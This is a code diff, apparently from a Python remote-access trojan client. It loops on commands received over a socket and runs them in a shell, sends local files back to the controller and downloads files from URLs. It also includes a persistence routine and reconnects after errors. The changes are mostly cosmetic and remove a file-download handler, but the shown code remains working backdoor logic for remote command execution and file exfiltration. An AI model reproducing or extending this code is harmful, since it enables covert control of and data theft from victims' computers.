@@ -20,24 +20,14 @@ def Upload(sock, file):
   try:
     f = open(file, 'rb')
   except IOError:
-    return 'Error opening file'
+    return 'Error opening file ⚠️'
   d = f.read()
   f.close()
   Send(sock, d + b'FILENAMEXXX%sFILEXXX' % file.encode())
   time.sleep(1)
   return 'File sent 🍺'
-
-def Download(sock, file):
-  try:
-    f = open(file, 'wb')
-  except IOError:
-    return 'Error opening file'
-  d = Receive(sock)
-  f.write(d)
-  f.close()
-  return 'File received 🍺'
-
-# download from url (unencrypted)
+ 
+# TODO: ssl
 def Downhttp(sock, url):
   fn = url.split('/')[-1]
   fn = fn.split('?')[0]
@@ -78,16 +68,11 @@ def Persist(sock, redown=None, newdir=None):
       return persist
 
 def run(s):
-  c = sp.Popen(s, 
-               shell=True, 
-               stdout=sp.PIPE, 
-               stderr=sp.PIPE)
+  c = sp.Popen(s, shell=True, stdout=sp.PIPE, stderr=sp.PIPE)
   out, err = c.communicate()
-  print(out)
-  print(err)
   out = out.decode('utf-8')
   err = err.decode('utf-8')
-  return out + err
+  return out + '\n' + err
 
 while True:
   try:
@@ -116,7 +101,8 @@ while True:
         ret = Downhttp(sock, data[9:])
 
       elif data.startswith('ul '):
-        ret = Download(sock, data[7:])
+        # TODO
+        pass
 
       elif data.startswith('persist '):
         # Attempt persistence
@@ -130,8 +116,9 @@ while True:
       else:
         ret = run(data)
 
-      ret = ret + '\n' + os.getcwd() + '>'
+      ret += '\n%s>' % os.getcwd()
       Send(sock, ret)
+
   except socket.error:
     sock.close()
     time.sleep(10)
